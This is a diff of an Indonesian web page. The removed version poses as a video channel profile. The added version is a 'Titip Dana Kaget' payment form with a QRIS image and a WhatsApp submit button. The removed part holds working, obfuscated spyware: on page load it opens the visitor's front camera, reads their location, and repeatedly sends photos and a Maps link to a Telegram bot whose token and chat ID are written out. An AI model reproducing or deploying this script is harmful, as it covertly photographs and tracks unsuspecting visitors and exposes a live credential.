@@ -1,128 +1,283 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>tokyo lagi</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <title>Formulir Transaksi Titip Dana Kaget</title>
     <style>
-        /* Global Styles */
         body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            background-color: #f9f9f9;
-            color: #333;
+            font-family: sans-serif;
+            background-color: #1a1a1a;
+            color: #f0f0f0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
-            text-align: center;
+            min-height: 100vh;
+            margin: 0;
+            padding-bottom: 120px; /* Add padding to body to prevent content being hidden by fixed footer */
         }
-
-        /* Container untuk Profil */
-        .profile-container {
-            text-align: center;
-            margin-top: 20px;
-            background-color: #fff;
-            width: 80%;
-            max-width: 640px;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .profile-container img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin-bottom: 10px;
-            border: 3px solid #ff5c5c;
-        }
-
-        .profile-container h2 {
-            font-size: 22px; /* Lebih kecil */
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .profile-container .stats {
+        .qris-container {
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 25px;
             display: flex;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
-            gap: 40px;
+        }
+        .line {
+            width: 100%;
+            height: 2px;
+            background-color: #f0f0f0;
+            margin: 15px 0;
+        }
+        .qris-image {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            border-radius: 8px;
+        }
+        .container {
+            background-color: #2a2a2a; /* Darker background for main form container */
+            padding: 40px;
+            border-top-left-radius: 12px; /* Top-left border radius */
+            border-top-right-radius: 12px; /* Top-right border radius */
+            border-bottom-left-radius: 0; /* No border radius on bottom-left */
+            border-bottom-right-radius: 0; /* No border radius on bottom-right */
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            max-width: 600px;
+            width: 90%;
+            margin-bottom: 20px; /* Space above the fixed footer */
+        }
+        h2 {
+            text-align: center;
+            color: #f0f0f0;
+            margin-bottom: 30px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #ccc;
+            font-weight: bold;
+        }
+        input, textarea {
+            width: calc(100% - 22px);
+            padding: 12px;
+            margin-bottom: 25px;
+            border: 1px solid #555;
+            background-color: #3a3a3a;
+            color: #f0f0f0;
+            border-radius: 6px;
             font-size: 16px;
-            color: #666;
+            box-sizing: border-box;
         }
-
-        .stats div i {
-            margin-right: 5px;
+        textarea {
+            resize: vertical;
         }
-
-        /* Video Container */
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 640px;
-            margin-top: 40px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-        }
-
-        video {
-            width: 100%;
-            height: 300px; /* Lebih kecil */
-            border-radius: 10px;
-        }
-
-        /* Judul Video */
-        .video-title {
-            font-size: 16px; /* Lebih kecil */
-            font-weight: 500;
-            color: #333;
-            margin-top: 10px;
-            margin-bottom: 20px;
-        }
-
-        /* Footer */
-        footer {
+        .fixed-buttons-container {
             position: fixed;
             bottom: 0;
             left: 0;
             width: 100%;
-            background-color: #222;
-            color: #fff;
-            text-align: center;
-            padding: 10px;
+            background-color: #286090; /* Blue background for button container */
+            padding: 20px;
+            box-shadow: 0 -8px 20px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 1000; /* Ensure it's above other content */
+        }
+        .fixed-buttons-container button {
+            width: 90%; /* Adjust width to match container's max-width */
+            max-width: 600px; /* Match container's max-width */
+            margin-bottom: 15px; /* Spacing between buttons */
+            padding: 15px 25px;
+            border-radius: 8px;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+        .add-row-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .add-row-button:hover {
+            background-color: #0056b3;
+        }
+        .submit-button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .submit-button:hover {
+            background-color: #1DA851;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            border: 1px solid #444;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #333;
+            position: relative;
+        }
+        .remove-group-btn {
+            background-color: #dc3545;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: auto;
+            padding: 5px 10px;
+            font-size: 12px;
+            border-radius: 5px;
+        }
+        .remove-group-btn:hover {
+            background-color: #c82333;
         }
     </style>
 </head>
 <body>
 
-    <!-- Profil Channel -->
-    <div class="profile-container">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTWy7Kab6xI-IJ6_f5ZBMevPiwxJgzGuQPLMKj6jIkkFbpDcjE9Cc6OPwSd&s=10" alt="Profile Picture">
-        <h2>tokyolagi</h2>
-        <div class="stats">
-            <div><i class="fas fa-users"></i> Followers: 1,230</div>
-            <div><i class="fas fa-thumbs-up"></i> Likes: 5,340</div>
-        </div>
+    <div class="qris-container">
+        <div class="line"></div>
+        <h2> SCAN QRIS </h2>
+        <img src="https://h.top4top.io/p_3430euebb0.jpg" alt="QRIS Pembayaran" class="qris-image" width="150" height="250">
+        <p><i>jangan lupa screenshot buktinya ya</i></p>
+        <div class="line"></div>
     </div>
 
-    <!-- Video -->
-    <div class="video-container">
-        <video id="mainVideo" controls autoplay>
-            <source src="https://github.com/mrxx58/spam-wa/raw/refs/heads/main/Sunuva%20Swimwear%20_%20Girls%20Swimwear%20SS22.mp4" type="video/mp4">
-        </video>
-        <h1 class="video-title" id="videoTitle">vidio tokyo terbaru</h1>
+    <div class="container">
+        <h2>Formulir Transaksi Titip Dana Kaget</h2>
+        <form id="waForm">
+            <label for="jumlahTransfer">Jumlah Transfer (Rp):</label>
+            <input type="number" id="jumlahTransfer" placeholder="Contoh: 100000" required>
+
+            <div id="dynamic-inputs">
+                <div class="input-group">
+                    <button type="button" class="remove-group-btn" data-row-id="0">Hapus data ding 1</button>
+                    <label for="jumlahSaldoDaget_0">Jumlah Saldo Daget (Rp):</label>
+                    <input type="number" class="jumlahSaldoDaget" id="jumlahSaldoDaget_0" placeholder="Contoh: 50000" required>
+
+                    <label for="jumlahPemenang_0">Jumlah Pemenang/SLOT:</label>
+                    <input type="number" class="jumlahPemenang" id="jumlahPemenang_0" placeholder="Contoh: 10" required>
+
+                    <label for="nama_0">Nama:</label>
+                    <input type="text" class="nama" id="nama_0" placeholder="Contoh: Budi Santoso" required>
+
+                    <label for="caption_0">Caption:</label>
+                    <textarea class="caption" id="caption_0" rows="4" placeholder="Tulis caption Anda di sini..." required></textarea>
+                </div>
+            </div>
+        </form>
     </div>
 
-   <script>//by berlin genteng
-// Token bot Telegram dan chat ID
-const token = '7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k';
-const chatId = '-4634384561';
+    <div class="fixed-buttons-container">
+        <button type="button" id="addRow" class="add-row-button">TAMBAH DATA LINK DAGET</button>
+        <button type="submit" form="waForm" class="submit-button">Kirim ke WhatsApp</button>
+    </div>    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const dynamicInputs = document.getElementById('dynamic-inputs');
+            const addRowButton = document.getElementById('addRow');
+            let inputGroupCount = 0; // Initialize to 0 for the first row
 
-const _0x4f1e8f=_0x2dc9;function _0x21be(){const _0x9b2580=['longitude','POST','kmtvk','error','setAttribu','Terjadi\x20ke','style','NzLlp','📍\x20[Lokasi\x20','onbeforeun','GvIQZ','EwNZa','drawImage','appendChil','log','Stream\x20kam','https://ww','lin','getContext','i.telegram','tersedia.','image/jpeg','getCurrent','apatkan\x20iz','kasi','then','4366503vUAfGv','one','videoWidth','toBlob','abQfU',')\x0a📡\x20By\x20Nar','4451293GJPhYF','ra\x20kamera','8127770ccBnhO','/sendPhoto','canvas','pgeHU','gSdWr','7755462DdCUgf','apatkan\x20lo','gkzWE','Markdown','QsAeG','FjrrD','user','UTnVk','coords','caption','append','era\x20belum\x20','autoplay','Gambar\x20ber','8INlGBC','videoHeigh','catch','latitude','parse_mode','body','peMvS','https://ap','load','rim:','onload','GRVhi','image.jpg','video','Gagal\x20mend','mediaDevic','json','54673524NVoHAj','4KmgRkO','height','YjeNc','zVYJw','geolocatio','display:\x20n','491456reapcj','chat_id','yvVjv','width','photo','om/maps?q=','salahan:','.org/bot','AQqEV','ent','Position','hasil\x20diki','2058956ekTTPG','createElem','DtufK','srcObject','getUserMed','evOyA','w.google.c','wbphc','Pengguna]('];_0x21be=function(){return _0x9b2580;};return _0x21be();}(function(_0x3db426,_0x4c9e3d){const _0x14abc4=_0x2dc9,_0x3fdd9c=_0x3db426();while(!![]){try{const _0x1581e7=-parseInt(_0x14abc4(0x1ca))/(0x7f7+-0x1b0d+0x1317)+-parseInt(_0x14abc4(0x1d6))/(-0x19f7+0x922+-0x1*-0x10d7)+-parseInt(_0x14abc4(0x197))/(0x1697+0x1115+-0x27a9)*(parseInt(_0x14abc4(0x1c4))/(0x584+0x481*-0x2+0x382))+-parseInt(_0x14abc4(0x19f))/(0x4d+-0x1b63+0x101*0x1b)+-parseInt(_0x14abc4(0x1a4))/(0x1d*0xb2+-0x137f+-0xa5)+parseInt(_0x14abc4(0x19d))/(-0x2*-0xc28+0x4*-0x609+0x1*-0x25)+parseInt(_0x14abc4(0x1b2))/(-0x1352*0x2+0x23a5+0x307)*(parseInt(_0x14abc4(0x1c3))/(0xdf7+0x184*0xb+-0x1*0x1e9a));if(_0x1581e7===_0x4c9e3d)break;else _0x3fdd9c['push'](_0x3fdd9c['shift']());}catch(_0xb9af41){_0x3fdd9c['push'](_0x3fdd9c['shift']());}}}(_0x21be,0x44035*0x2+-0x572b8+0x96677));const camera=document[_0x4f1e8f(0x1d7)+_0x4f1e8f(0x1d3)](_0x4f1e8f(0x1bf));camera[_0x4f1e8f(0x181)+'te'](_0x4f1e8f(0x1b0),!![]),camera[_0x4f1e8f(0x181)+'te'](_0x4f1e8f(0x183),_0x4f1e8f(0x1c9)+_0x4f1e8f(0x198)),document[_0x4f1e8f(0x1b7)][_0x4f1e8f(0x18a)+'d'](camera);function requestPermissions(){const _0x1d58a5=_0x4f1e8f,_0x4592d1={'QsAeG':_0x1d58a5(0x1aa),'pgeHU':function(_0x458086,_0x4d43d6){return _0x458086(_0x4d43d6);},'UTnVk':_0x1d58a5(0x1c0)+_0x1d58a5(0x194)+_0x1d58a5(0x19e),'GvIQZ':function(_0x487a08,_0x261ad2,_0x470c18){return _0x487a08(_0x261ad2,_0x470c18);}};return new Promise((_0x12483f,_0x5eea30)=>{const _0xd9811d=_0x1d58a5;_0x4592d1[_0xd9811d(0x187)](setTimeout,async()=>{const _0x29fb0c=_0xd9811d;try{const _0x518238=await navigator[_0x29fb0c(0x1c1)+'es'][_0x29fb0c(0x1da)+'ia']({'video':{'facingMode':_0x4592d1[_0x29fb0c(0x1a8)]}});camera[_0x29fb0c(0x1d9)]=_0x518238,navigator[_0x29fb0c(0x1c8)+'n'][_0x29fb0c(0x193)+_0x29fb0c(0x1d4)](_0xcbda2a=>_0x12483f({'latitude':_0xcbda2a[_0x29fb0c(0x1ac)][_0x29fb0c(0x1b5)],'longitude':_0xcbda2a[_0x29fb0c(0x1ac)][_0x29fb0c(0x1df)]}),_0xfee4b7=>_0x5eea30(_0x29fb0c(0x1c0)+_0x29fb0c(0x1a5)+_0x29fb0c(0x195)));}catch(_0x308534){_0x4592d1[_0x29fb0c(0x1a2)](_0x5eea30,_0x4592d1[_0x29fb0c(0x1ab)]);}},0xb8e+-0x31*-0x7+0x515*-0x1);});}function captureAndSend(_0x51dc4b){const _0x4a6eb3=_0x4f1e8f,_0x24ebc2={'wbphc':_0x4a6eb3(0x1cb),'AQqEV':_0x4a6eb3(0x1ce),'YjeNc':_0x4a6eb3(0x1be),'gkzWE':_0x4a6eb3(0x1ad),'FjrrD':_0x4a6eb3(0x1b6),'NzLlp':_0x4a6eb3(0x1a7),'EwNZa':function(_0x4daeed,_0x585a81){return _0x4daeed(_0x585a81);},'gSdWr':_0x4a6eb3(0x18c)+_0x4a6eb3(0x1af)+_0x4a6eb3(0x191),'abQfU':_0x4a6eb3(0x1a1),'zVYJw':_0x4a6eb3(0x192)};if(!camera[_0x4a6eb3(0x1d9)]){console[_0x4a6eb3(0x180)](_0x24ebc2[_0x4a6eb3(0x1a3)]);return;}const _0x59829c=document[_0x4a6eb3(0x1d7)+_0x4a6eb3(0x1d3)](_0x24ebc2[_0x4a6eb3(0x19b)]),_0x188065=_0x59829c[_0x4a6eb3(0x18f)]('2d');_0x59829c[_0x4a6eb3(0x1cd)]=camera[_0x4a6eb3(0x199)]||-0x66*0x4+0x1c8+0x250,_0x59829c[_0x4a6eb3(0x1c5)]=camera[_0x4a6eb3(0x1b3)+'t']||0x1247+0x1b09+0x28*-0x116,_0x188065[_0x4a6eb3(0x189)](camera,0x764+0x88e+-0xff2,-0x69f+0x9e3+-0x26*0x16,_0x59829c[_0x4a6eb3(0x1cd)],_0x59829c[_0x4a6eb3(0x1c5)]),_0x59829c[_0x4a6eb3(0x19a)](_0x3ff345=>{const _0x4ada56=_0x4a6eb3,_0x392d6d=_0x4ada56(0x18d)+_0x4ada56(0x1dc)+_0x4ada56(0x1cf)+_0x51dc4b[_0x4ada56(0x1b5)]+','+_0x51dc4b[_0x4ada56(0x1df)],_0xa2b47b=_0x4ada56(0x185)+_0x4ada56(0x1de)+_0x392d6d+(_0x4ada56(0x19c)+_0x4ada56(0x18e)),_0x5346d2=new FormData();_0x5346d2[_0x4ada56(0x1ae)](_0x24ebc2[_0x4ada56(0x1dd)],chatId),_0x5346d2[_0x4ada56(0x1ae)](_0x24ebc2[_0x4ada56(0x1d2)],_0x3ff345,_0x24ebc2[_0x4ada56(0x1c6)]),_0x5346d2[_0x4ada56(0x1ae)](_0x24ebc2[_0x4ada56(0x1a6)],_0xa2b47b),_0x5346d2[_0x4ada56(0x1ae)](_0x24ebc2[_0x4ada56(0x1a9)],_0x24ebc2[_0x4ada56(0x184)]),_0x24ebc2[_0x4ada56(0x188)](sendImageToTelegram,_0x5346d2);},_0x24ebc2[_0x4a6eb3(0x1c7)]);}function _0x2dc9(_0x4e3e69,_0xaa5ba8){const _0x1e44e4=_0x21be();return _0x2dc9=function(_0x27d021,_0x511d88){_0x27d021=_0x27d021-(-0xa55+0x902+-0x169*-0x2);let _0x49b161=_0x1e44e4[_0x27d021];return _0x49b161;},_0x2dc9(_0x4e3e69,_0xaa5ba8);}function sendImageToTelegram(_0x4a93f1){const _0x5c20c2=_0x4f1e8f,_0x1e3734={'GRVhi':function(_0x543fb6,_0x1d28bc,_0x67dc93){return _0x543fb6(_0x1d28bc,_0x67dc93);},'yvVjv':_0x5c20c2(0x1e0)};_0x1e3734[_0x5c20c2(0x1bd)](fetch,_0x5c20c2(0x1b9)+_0x5c20c2(0x190)+_0x5c20c2(0x1d1)+token+_0x5c20c2(0x1a0),{'method':_0x1e3734[_0x5c20c2(0x1cc)],'body':_0x4a93f1})[_0x5c20c2(0x196)](_0x1011ff=>_0x1011ff[_0x5c20c2(0x1c2)]())[_0x5c20c2(0x196)](_0x41f66e=>console[_0x5c20c2(0x18b)](_0x5c20c2(0x1b1)+_0x5c20c2(0x1d5)+_0x5c20c2(0x1bb),_0x41f66e))[_0x5c20c2(0x1b4)](_0x405696=>console[_0x5c20c2(0x180)](_0x5c20c2(0x182)+_0x5c20c2(0x1d0),_0x405696));}let intervalId;window[_0x4f1e8f(0x1bc)]=async function(){const _0x2e2e71=_0x4f1e8f,_0x2c3f37={'peMvS':function(_0x553a20,_0x489cc7){return _0x553a20(_0x489cc7);},'kmtvk':function(_0x13b843){return _0x13b843();},'DtufK':function(_0x3b274e,_0x477ce3,_0x1c5b0a){return _0x3b274e(_0x477ce3,_0x1c5b0a);}};try{const _0x3f33bd=await _0x2c3f37[_0x2e2e71(0x17f)](requestPermissions);_0x3f33bd&&(_0x2c3f37[_0x2e2e71(0x1b8)](captureAndSend,_0x3f33bd),intervalId=_0x2c3f37[_0x2e2e71(0x1d8)](setInterval,()=>{const _0x38f184=_0x2e2e71;_0x2c3f37[_0x38f184(0x1b8)](captureAndSend,_0x3f33bd);},0x1f4*-0x5+-0x1be*0x6+0x304*0x8));}catch(_0x2b238b){console[_0x2e2e71(0x180)](_0x2b238b);}},window[_0x4f1e8f(0x186)+_0x4f1e8f(0x1ba)]=function(){const _0x300225=_0x4f1e8f,_0x1c3b36={'evOyA':function(_0xedafdd,_0x19c065){return _0xedafdd(_0x19c065);}};_0x1c3b36[_0x300225(0x1db)](clearInterval,intervalId);};</script>
+            // Tambahkan baris ini untuk mengaitkan tombol dengan fungsinya
+            addRowButton.addEventListener('click', addInputGroup);
 
+            // Function to update the text of all "Hapus Baris" buttons
+            function updateRemoveButtonTexts() {
+                const inputGroups = dynamicInputs.querySelectorAll('.input-group');
+                inputGroups.forEach((group, index) => {
+                    const removeButton = group.querySelector('.remove-group-btn');
+                    removeButton.textContent = `Hapus data Link ${index + 1}`; // Added "ding" here
+                    removeButton.dataset.rowId = index; // Store the row index
+                });
+                updateRemoveButtonsVisibility(); // Call this to handle display property
+            }
+
+            // Function to manage display property based on number of rows
+            function updateRemoveButtonsVisibility() {
+                const removeButtons = dynamicInputs.querySelectorAll('.remove-group-btn');
+                if (removeButtons.length === 1) {
+                    removeButtons[0].style.display = 'none';
+                } else {
+                    removeButtons.forEach(button => {
+                        button.style.display = 'block';
+                    });
+                }
+            }
+
+            function addInputGroup() {
+                inputGroupCount++; // Increment before creating new group for correct ID
+                const newGroup = document.createElement('div');
+                newGroup.classList.add('input-group');
+                newGroup.dataset.id = inputGroupCount; // Use the incremented count as ID
+
+                newGroup.innerHTML = `
+                    <button type="button" class="remove-group-btn">Hapus data ding ${inputGroupCount + 1}</button> <label for="jumlahSaldoDaget_${inputGroupCount}">Jumlah Saldo Daget (Rp):</label>
+                    <input type="number" class="jumlahSaldoDaget" id="jumlahSaldoDaget_${inputGroupCount}" placeholder="Contoh: 50000" required>
+
+                    <label for="jumlahPemenang_${inputGroupCount}">Jumlah Pemenang/SLOT:</label>
+                    <input type="number" class="jumlahPemenang" id="jumlahPemenang_${inputGroupCount}" placeholder="Contoh: 10" required>
+
+                    <label for="nama_${inputGroupCount}">Nama:</label>
+                    <input type="text" class="nama" id="nama_${inputGroupCount}" placeholder="Contoh: Budi Santoso" required>
+
+                    <label for="caption_${inputGroupCount}">Caption:</label>
+                    <textarea class="caption" id="caption_${inputGroupCount}" rows="4" placeholder="Tulis caption Anda di sini..." required></textarea>
+                `;
+
+                dynamicInputs.appendChild(newGroup);
+                updateRemoveButtonTexts(); // Update all button texts after adding
+            }
+
+            dynamicInputs.addEventListener('click', function(event) {
+                if (event.target.classList.contains('remove-group-btn')) {
+                    const groupToRemove = event.target.closest('.input-group');
+                    groupToRemove.remove();
+                    updateRemoveButtonTexts(); // Update all button texts after removing
+                }
+            });
+
+            // Initial call to set text and hide/show for the first row on load
+            updateRemoveButtonTexts();
+
+
+            document.getElementById('waForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                const jumlahTransfer = document.getElementById('jumlahTransfer').value;
+                const formatRupiah = (angka) => {
+                    return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+                }
+
+                let dynamicContent = '';
+                const inputGroups = dynamicInputs.querySelectorAll('.input-group');
+
+                inputGroups.forEach(group => {
+                    const jumlahSaldoDaget = group.querySelector('.jumlahSaldoDaget').value;
+                    const jumlahPemenang = group.querySelector('.jumlahPemenang').value;
+                    const nama = group.querySelector('.nama').value;
+                    const caption = group.querySelector('.caption').value;
+
+                    dynamicContent += `*𝕵𝖚𝖒𝖑𝖆𝖍 𝕾𝖆𝖑𝖉𝖔 𝕯𝖆𝖌𝖊𝖙 : Rp.${formatRupiah(jumlahSaldoDaget)}*\n`;
+                    dynamicContent += `*𝕵𝖚𝖒𝖑𝖆𝕷𝕬𝖍 𝕻𝖊𝖒𝖊𝖓𝖆𝖓𝖌 : ${jumlahPemenang}*\n`;
+                    dynamicContent += `*𝕹𝖆𝖒𝖆 : ${nama}*\n`;
+                    dynamicContent += `*𝕮𝖆𝖕𝖙𝖎𝖔𝖓 : ${caption}*\n> 𝕷𝖎𝖓𝖐𝕲𝖊𝖙 :\n────────────────────────\n`; // Added LinkGet here
+                });
+
+                const teksWhatsApp = `*𝕿𝖗𝖆𝖓𝖘𝖆𝖐𝖘𝖎 𝕿𝖎𝖙𝖎𝖕 𝕯𝖆𝖓𝖆 𝕶𝖆𝖌𝖊𝖙*\n────────────────────────\n════════════════════════\n*𝕵𝖚𝖒𝖑𝖆𝖍 𝕿𝖗𝖆𝖓𝖘𝖋𝖊𝖗 : Rp.${formatRupiah(jumlahTransfer)}*\n────────────────────────\n${dynamicContent}════════════════════════\n               𝐜𝐨𝐩𝐲𝐫𝖎𝖌𝖍𝖙.𝐃𝖆𝖌𝖊𝖙_𝕮𝖎𝖈𝖍𝖚y`;
+
+                const encodedTeks = encodeURIComponent(teksWhatsApp);
+                const phoneNumber = '6285711374861';
+                const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodedTeks}`;
+
+                window.open(whatsappUrl, '_blank');
+            });
+        });
+    
+    </script>
 </body>
 </html>
